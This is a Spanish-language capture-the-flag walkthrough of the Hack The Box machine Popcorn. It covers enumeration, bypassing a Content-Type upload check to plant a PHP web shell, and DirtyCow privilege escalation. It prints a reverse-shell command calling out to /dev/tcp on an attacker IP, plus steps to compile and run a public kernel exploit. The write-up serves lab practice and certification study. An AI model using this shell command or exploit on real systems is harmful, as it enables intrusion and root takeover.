# Popcorn

**Sistema Operativo**: Linux

**Dificultad**: Media

**Técnicas Vistas**: Web Enumeration /
File Upload Vulnerability - Abusing Content-Type to Upload Malicious PHP File (RCE) /
Kernel Exploitation (2.6.31) - DirtyCow (/etc/passwd) [Privilege Escalation]


Te prepara para las **Certificaciones**: eWPT eJPT


![image](https://github.com/user-attachments/assets/240a731e-da22-4e49-a7c2-6caa504ee160)<br><br>


# Reconocimiento

Utilizando `nmap` vemos los puertos abiertos

![image](https://github.com/user-attachments/assets/53aa81d7-513b-46fc-8381-abdb8b50d65b)<br><br>


Utilizando `nmap` encontramos el nombre de dominio

![Image](https://github.com/user-attachments/assets/4b502893-40bc-4218-a91d-0cd1e0b2fa81)<br><br>

En `vim /etc/hosts` ponemos abajo `10.10.10.6 popcorn.htb`


Utilizando `gobuster` y el diccionario `seclists` encontramos las siguientes rutas:

![Image](https://github.com/user-attachments/assets/42b0a1d4-664a-4d2c-b1eb-17eab598e118)<br><br>

# Explotación Torrent Hoster (subida de archivos)

Descargamos el torrent de kali linux

![Image](https://github.com/user-attachments/assets/099ddbf4-c66e-4764-b4d1-11dad8b6b0d1)<br><br>

Lo subimos en "Upload"

![Image](https://github.com/user-attachments/assets/6812018e-2943-4e59-91d8-bc87958f0cae)<br><br>

En "Edit this torrent" vemos que podemos subir una imagen (interceptamos con `Burpsuite`)

![Image](https://github.com/user-attachments/assets/bc983788-b3f6-4347-930c-2ab1b5fceff7)<br><br>

Solo valida el "Content-type" osea que si ponemos "image/jpeg" podemos subir un archivo ".php" con codigo malicioso

![Image](https://github.com/user-attachments/assets/f2d729b2-67eb-4750-99f2-881de0b0ce10)<br><br>

`http://popcorn.htb/torrent/upload/9ba2973f0afd6c7cdd5356efed489e3fb0cdf20f.php?cmd=bash -c "bash -i >%26 /dev/tcp/10.10.14.9/443 0>%261"` Vamos a la ruta donde se sube el ".php" y ganamos acceso.<br><br>

# Escalamos privilegios

Utilizando `uname -a` vemos que la version del kernel es muy antigua. (La explotamos con este exploit https://www.exploit-db.com/exploits/40839)

![Image](https://github.com/user-attachments/assets/736dbc70-881e-4ae3-b485-072854d17756)<br><br>


Vamos a `/tmp` creamos un `nano dirty.c` y pegamos todo el exploit.
Lo compilamos asi `gcc -pthread dirty.c -o dirty -lcrypt`
Y lo explotamos asi `./dirty`

Nos convertimos en "firefart" y tiene privilegios "Root" -> `su firefart` y la contraseña que le asignamos.

Podemos leer la flag:

![Image](https://github.com/user-attachments/assets/11c14ebb-c0ae-4bb0-928b-70438514b660)<br><br>
